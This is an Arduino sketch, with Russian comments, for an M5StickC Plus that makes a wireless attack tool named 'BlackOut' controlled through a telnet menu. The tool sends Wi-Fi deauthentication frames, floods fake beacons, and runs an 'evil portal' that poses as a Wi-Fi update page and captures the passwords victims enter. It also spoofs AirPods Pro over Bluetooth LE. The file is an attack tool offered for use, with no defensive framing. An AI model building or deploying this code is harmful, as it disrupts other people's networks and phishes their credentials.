#include <M5StickCPlus.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEServer.h>
#include <WebServer.h>
#include <DNSServer.h>

// ========== НАСТРОЙКИ ==========
const char* ap_ssid = "BlackOut";
const char* ap_password = "password";
const char* target_bssid = "FF:FF:FF:FF:FF:FF"; // замените на MAC цели
int deauth_channel = 6;
int deauth_count = 50;

// ========== ГЛОБАЛЬНЫЕ ОБЪЕКТЫ ==========
WiFiServer telnetServer(23);
WiFiClient telnetClient;
WebServer server(80);
DNSServer dnsServer;

// ========== ОБЪЯВЛЕНИЯ ФУНКЦИЙ ==========
void deauth_attack();
void beacon_flood();
void evil_portal();
void ble_spoof_airpods();
void showMenu(WiFiClient &client);

// ========== DEAUTH ==========
void deauth_attack() {
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(deauth_channel, WIFI_SECOND_CHAN_NONE);
  
  uint8_t deauth_frame[26] = {
    0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x01, 0x00
  };
  uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
  memcpy(&deauth_frame[4], broadcast, 6);
  
  M5.Lcd.printf("[Deauth] Отправка %d пакетов на канале %d\n", deauth_count, deauth_channel);
  for (int i = 0; i < deauth_count; i++) {
    esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame), false);
    delay(1);
  }
  esp_wifi_set_promiscuous(false);
  M5.Lcd.println("[Deauth] Завершён");
}

// ========== BEACON FLOOD ==========
void beacon_flood() {
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
  uint8_t beacon_frame[] = {
    0x80, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x0A, 0x42, 0x6C, 0x61, 0x63, 0x6B, 0x4F, 0x75, 0x74,
    0x01, 0x08, 0x82, 0x84, 0x8B, 0x96, 0x24, 0x30, 0x48, 0x6C,
    0x03, 0x01, 0x06
  };
  for (int i = 0; i < 100; i++) {
    for (int j = 0; j < 6; j++) beacon_frame[10+j] = random(256);
    esp_wifi_80211_tx(WIFI_IF_STA, beacon_frame, sizeof(beacon_frame), false);
    delay(10);
  }
  esp_wifi_set_promiscuous(false);
  M5.Lcd.println("[Beacon] 100 точек отправлено");
}

// ========== EVIL PORTAL ==========
void handleRoot() {
  String html = "<html><body><h1>Wi-Fi обновление</h1><form method='POST' action='/pass'><input type='password' name='pwd'><input type='submit'></form></body></html>";
  server.send(200, "text/html", html);
}
void handlePass() {
  String pwd = server.arg("pwd");
  M5.Lcd.printf("[Portal] Пароль: %s\n", pwd.c_str());
  server.send(200, "text/html", "<h2>OK</h2>");
}
void evil_portal() {
  WiFi.mode(WIFI_AP);
  WiFi.softAP(ap_ssid, ap_password);
  dnsServer.start(53, "*", WiFi.softAPIP());
  server.on("/", handleRoot);
  server.on("/pass", HTTP_POST, handlePass);
  server.begin();
  M5.Lcd.printf("[Portal] Запущен на %s\n", WiFi.softAPIP().toString().c_str());
}

// ========== BLE SPOOF (исправлен) ==========
void ble_spoof_airpods() {
  BLEDevice::init("AirPods Pro");
  BLEAdvertising *pAdvertising = BLEDevice::getAdvertising();
  BLEAdvertisementData data;
  data.setName("AirPods Pro");
  uint8_t appleData[] = {0x4c, 0x00, 0x12, 0x19, 0x00, 0x00, 0x00, 0x00};
  // Исправление: преобразуем в String
  data.setManufacturerData(String((char*)appleData, sizeof(appleData)));
  pAdvertising->setAdvertisementData(data);
  pAdvertising->start();
  M5.Lcd.println("[BLE] AirPods Spoof активен (нажмите A или B для остановки)");
  // Ждём нажатия A или B (BtnC нет на Plus2)
  while (!M5.BtnA.wasPressed() && !M5.BtnB.wasPressed()) {
    M5.update();
    delay(100);
  }
  pAdvertising->stop();
  M5.Lcd.println("[BLE] Остановлен");
}

// ========== МЕНЮ ==========
void showMenu(WiFiClient &client) {
  client.println("\n==================================");
  client.println("      BLACKOUT TELNET v3.0");
  client.println("==================================");
  client.println("  1. Deauth Attack");
  client.println("  2. Beacon Flood");
  client.println("  3. Evil Portal");
  client.println("  4. BLE Spoof AirPods");
  client.println("  5. Показать меню");
  client.println("  0. Отключиться");
  client.println("==================================");
  client.print("Выберите номер: ");
}

// ========== SETUP ==========
void setup() {
  M5.begin();
  M5.Lcd.setRotation(1);
  M5.Lcd.fillScreen(BLACK);
  M5.Lcd.setTextColor(GREEN);
  M5.Lcd.setTextSize(2);
  M5.Lcd.setCursor(0,0);
  M5.Lcd.println("BlackOut Telnet");
  M5.Lcd.setTextSize(1);

  WiFi.mode(WIFI_AP);
  WiFi.softAP(ap_ssid, ap_password);
  IPAddress myIP = WiFi.softAPIP();
  M5.Lcd.printf("AP IP: %s\n", myIP.toString().c_str());
  M5.Lcd.println("Telnet port 23");

  telnetServer.begin();
  telnetServer.setNoDelay(true);
}

// ========== LOOP ==========
void loop() {
  M5.update();

  if (telnetServer.hasClient()) {
    if (!telnetClient || !telnetClient.connected()) {
      if (telnetClient) telnetClient.stop();
      telnetClient = telnetServer.available();
      telnetClient.println("\nДобро пожаловать!");
      showMenu(telnetClient);
    } else {
      WiFiClient newClient = telnetServer.available();
      newClient.println("Занято");
      newClient.stop();
    }
  }

  if (telnetClient && telnetClient.connected()) {
    if (telnetClient.available()) {
      String cmd = telnetClient.readStringUntil('\n');
      cmd.trim();
      if (cmd == "1") { deauth_attack(); telnetClient.println("[+] Deauth выполнен"); showMenu(telnetClient); }
      else if (cmd == "2") { beacon_flood(); telnetClient.println("[+] Beacon запущен"); showMenu(telnetClient); }
      else if (cmd == "3") { evil_portal(); telnetClient.println("[+] Evil Portal активен"); showMenu(telnetClient); }
      else if (cmd == "4") { ble_spoof_airpods(); telnetClient.println("[+] BLE Spoof остановлен"); showMenu(telnetClient); }
      else if (cmd == "5") { showMenu(telnetClient); }
      else if (cmd == "0") { telnetClient.println("До свидания."); telnetClient.stop(); }
      else { telnetClient.println("Неизвестно. Введите 1-5 или 0."); showMenu(telnetClient); }
    }
  }

  dnsServer.processNextRequest();
  server.handleClient();
}
